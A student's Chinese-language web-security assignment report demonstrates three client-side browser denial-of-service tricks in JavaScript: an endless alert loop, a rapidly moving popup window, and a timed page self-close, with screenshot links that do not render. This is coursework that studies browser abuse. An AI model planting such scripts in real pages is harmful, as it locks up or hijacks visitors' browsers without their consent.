# Web Security report ---- assignment 2

#### 57118423 宋昌霖

实验要求：在页面中实现任意三种通过客户端让浏览器产生拒绝服务或其他影响用户使用浏览器环境效果的功能，包括但不限于循环弹出对话窗口、新建窗口并随机变化位置、更改窗口焦点、修改回退功能退出常用网站等。

### 功能一：

无限弹窗

代码如下：

```
function alertLoop()
{
	const messages = ['This is a trap!','got you!']
	while(true)
	{
		messages.forEach(window.alert)
	}
}
```

![image-20211209162606006](C:\Users\scl\AppData\Roaming\Typora\typora-user-images\image-20211209162606006.png)

![image-20211209162626132](C:\Users\scl\AppData\Roaming\Typora\typora-user-images\image-20211209162626132.png)

### 功能二：

生成快速移动的干扰窗口

代码如下：

```
function newWin()
{
	var winArr = []
	const win = window.open('','','width=400,height=300')
	let i=0
	setInterval(() =>{
	setInterval(() =>{
		win.moveTo(i,i)
		win.resizeTo(400,300)
		i = (i+50) % 200
	},100)
	},100)
	winArr.push(win)
	
}
```

![win](C:\Users\scl\Desktop\win.gif)

### 功能三：

关闭当前窗口

代码如下

```
var i=2
function ClosePage(){
  i=i-1
  
  
  if(i>0){
    setTimeout("ClosePage();",1000);
  }
  else{
    self.close();
  }
}
```

可以设置关闭的时间节点，效果如下

![close](C:\Users\scl\Desktop\close.gif)